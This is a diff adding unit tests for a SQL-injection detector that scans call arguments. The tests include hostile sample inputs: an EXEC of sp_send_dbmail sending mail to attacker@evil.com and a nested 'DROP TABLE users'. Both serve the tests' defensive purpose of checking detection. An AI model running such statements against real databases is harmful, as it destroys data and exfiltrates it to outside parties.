@@ -121,3 +121,29 @@ def test_list_param_scanning():
     assert result.matched is True
     assert result.detector_name == "sql_injection"
     assert "queries[1]" in result.detail
+
+
+def test_exec_call():
+    result = detect(_call({"query": "EXEC(sp_send_dbmail @recipients='attacker@evil.com')"}))
+    assert result.matched is True
+    assert result.detector_name == "sql_injection"
+    assert "EXEC" in result.detail
+
+
+def test_nested_list_bypass():
+    """Strings inside list[list[...]] must be scanned (not bypassed)."""
+    result = detect(_call({"data": [["DROP TABLE users"]]}))
+    assert result.matched is True
+    assert result.detector_name == "sql_injection"
+    assert "data[0][0]" in result.detail
+
+
+def test_insert_into_english_prose_is_accepted_fp():
+    """'insert into' in English prose matches INSERT INTO — accepted false positive.
+
+    The regex requires the two-word SQL structural context (INSERT followed by INTO).
+    Natural English rarely produces this exact bigram, but when it does, we accept
+    the FP. Narrowing to require parentheses after the table name is a v1 option.
+    """
+    result = detect(_call({"text": "Please insert into the record your full name"}))
+    assert result.matched is True  # accepted FP — documented
